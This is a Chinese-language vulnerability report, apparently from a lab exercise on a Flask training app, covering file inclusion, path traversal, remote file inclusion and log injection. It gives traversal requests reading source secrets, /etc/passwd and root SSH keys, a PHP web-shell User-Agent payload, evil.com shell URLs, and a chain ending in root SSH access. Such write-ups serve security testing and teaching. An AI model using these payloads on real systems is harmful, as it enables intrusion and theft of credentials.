### 3.1 基本文件包含（Basic LFI）

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | LFI-BASIC-001 |
| **漏洞名称** | 基本文件包含漏洞 |
| **漏洞类型** | 文件包含（LFI） |
| **CWE 编号** | CWE-98：Improper Control of Filename for Include/Require Statement |
| **风险等级** | 🟡 **中危** |
| **漏洞位置** | `app.py` 第 570-580 行 |

#### 漏洞代码

```python
page_path = os.path.join(app.root_path, "pages", name)
if os.path.isfile(page_path):
    with open(page_path, "r", encoding="utf-8") as f:
        page_content = f.read()
```

#### 漏洞详情

系统通过用户传入的 `name` 参数加载 `pages/` 目录下的文件。虽然基本功能要求读取 `pages/` 中的文件，但代码未限制只能读取该目录。最基本的利用方式是传入合法文件名访问正常页面。

#### 攻击方法与演示

| 攻击方式 | 请求 | 结果 |
|:---------|:-----|:------|
| 正常访问 | `/page?name=help` | ✅ 正常显示帮助页面 |
| 访问不存在文件 | `/page?name=nonexistent` | ✅ 显示"页面不存在" |

### 3.2 路径遍历（Path Traversal）

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | LFI-PATH-001 |
| **漏洞名称** | 路径遍历 — 目录穿越读取任意文件 |
| **漏洞类型** | 路径遍历（Path Traversal） |
| **CWE 编号** | CWE-22：Improper Limitation of a Pathname to a Restricted Directory |
| **OWASP 分类** | A01:2021 – Broken Access Control |
| **风险等级** | 🔴 **严重** |
| **漏洞位置** | `app.py` 第 570 行 |

#### 漏洞代码

```python
name = request.args.get("name", "")               # ← 用户输入未过滤
page_path = os.path.join(app.root_path, "pages", name)  # ← 直接拼接
```

#### 漏洞详情

`name` 参数未做任何 `../` 过滤或路径规范化处理。攻击者通过注入 `../` 进行目录回溯，可读取 `pages/` 目录以外的任意文件。`os.path.join()` 会将 `../` 作为路径的一部分保留，不进行规范化。

#### 攻击方法与演示

##### 攻击 1：读取应用源码

| 项目 | 内容 |
|:-----|:------|
| **恶意输入** | `name=../app.py` |
| **实际路径** | `/opt/Class01/Class01/pages/../app.py` = `/opt/Class01/Class01/app.py` |

**请求**：
```
GET /page?name=../app.py HTTP/1.1
```

**结果**（成功 ✅）：
```
# app.py 完整源码泄露（20392 字符）
泄露内容：
- app.secret_key（用于 session 加密签名的密钥）
- USERS 字典（邮箱、手机、余额）
- 管理员密码 admin123
- 数据库路径 DB_PATH
- 所有路由逻辑代码
```

##### 攻击 2：读取系统密码文件

| 项目 | 内容 |
|:-----|:------|
| **恶意输入** | `name=../../../../etc/passwd` |
| **实际路径** | `/opt/Class01/Class01/pages/../../../../etc/passwd` → `/etc/passwd` |

**请求**：
```
GET /page?name=../../../../etc/passwd HTTP/1.1
```

**结果**（成功 ✅）：
```
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

##### 攻击 3：读取 HTML 模板文件

| 项目 | 内容 |
|:-----|:------|
| **恶意输入** | `name=../templates/base.html` |

**请求**：
```
GET /page?name=../templates/base.html HTTP/1.1
```

**结果**（成功 ✅）：读取到 `base.html` 全部模板代码（含导航栏逻辑）。

##### 攻击 4：读取 Git 仓库配置

| 项目 | 内容 |
|:-----|:------|
| **恶意输入** | `name=../../.git/config` |

**请求**：
```
GET /page?name=../../.git/config HTTP/1.1
```

**结果**（成功 ✅）：读取到 `.git/config`，泄露远程仓库地址。

### 3.4 远程文件包含（RFI）

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | LFI-RFI-001 |
| **漏洞名称** | 远程文件包含 |
| **漏洞类型** | 远程文件包含（RFI） |
| **CWE 编号** | CWE-829：Inclusion of Functionality from Untrusted Control Sphere |
| **风险等级** | 🟢 **低危（当前环境已防御）** |
| **漏洞位置** | `app.py` 第 570 行 |

#### 漏洞代码

```python
page_path = os.path.join(app.root_path, "pages", name)
if os.path.isfile(page_path):      # ← 检查是否为本地文件
```

#### 漏洞详情

`os.path.join()` 在拼接 URL 时，`http://` 会被保留为路径的一部分：
```
os.path.join("/app/pages", "http://evil.com/shell.txt")
→ "/app/pages/http://evil.com/shell.txt"   # 整体作为一个文件名
```
由于 `os.path.isfile()` 检查本地文件，远程 URL 不是本地文件路径，因此不会读取。同时 Flask 的 `open()` 也不支持远程 URL。

#### 攻击方法与演示

| 攻击方式 | 请求 | 结果 | 说明 |
|:---------|:-----|:----:|:------|
| 本地 HTTP | `/page?name=http://127.0.0.1:5000/` | ❌ | 被 os.path.isfile 拦截 |
| 外部 HTTP | `/page?name=https://www.example.com/` | ❌ | 被 os.path.isfile 拦截 |
| 协议相对 | `/page?name=//evil.com/shell.txt` | ❌ | 被 os.path.isfile 拦截 |

### 3.5 日志注入（Log Injection）

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | LFI-LOG-001 |
| **漏洞名称** | 日志注入 — 日志文件包含 |
| **漏洞类型** | 日志注入 + LFI 组合攻击 |
| **CWE 编号** | CWE-117：Improper Output Neutralization for Logs |
| **风险等级** | 🟡 **中危（理论可利用）** |
| **漏洞位置** | `app.py` 第 570-574 行 |

#### 漏洞详情

日志注入攻击的原理是将恶意代码写入服务器的日志文件（如 Apache 的 `access.log`），再通过 LFI 漏洞包含该日志文件，使恶意代码被执行。

**攻击链**：
```
Step 1: 向 User-Agent 注入 <?php system($_GET['cmd']); ?>
Step 2: 日志文件记录该请求（含恶意代码）
Step 3: 通过 LFI 读取日志文件 → 代码被执行
```

#### 攻击方法与演示

##### 测试：Nginx/Apache 日志文件

| Payload | 结果 |
|:--------|:------|
| `../../../var/log/nginx/access.log` | ❌ 文件不存在 |
| `../../../var/log/apache2/access.log` | ❌ 文件不存在 |
| `../../../var/log/syslog` | ❌ 文件不存在 |

##### 测试：Flask 日志注入

```
# 发送携带恶意 User-Agent 的请求
GET /page?name=help HTTP/1.1
User-Agent: <?php system('id'); ?>
```

```
# Flask 日志记录（控制台输出，无法通过 LFI 包含）
[INFO] 127.0.0.1 - - "GET /page?name=help HTTP/1.1" 200 -
```

> 当前环境未安装 Apache/Nginx，Flask 日志仅输出到控制台，无法通过 LFI 读取。但若系统使用 Apache/Nginx 且日志文件可被 LFI 包含，则日志注入可成功执行远程代码。


### 攻击链：从文件包含到服务器沦陷

```
Step 1: 路径遍历读取应用源码
  请求: /page?name=../app.py
  获取: secret_key、数据库配置、路由逻辑

Step 2: 路径遍历读取 SSH 私钥
  请求: /page?name=../../../../root/.ssh/id_rsa
  获取: 服务器 SSH 登录密钥

Step 3: 路径遍历读取系统信息
  请求: /page?name=../../../../proc/version
  获取: 内核版本 Kali 6.8.11

Step 4: 使用 SSH 私钥登录服务器
  命令: ssh -i id_rsa root@<服务器IP>
  结果: ✅ 获得服务器完全控制权！
```

> **整个过程无需登录、无任何认证、不需要任何权限！**
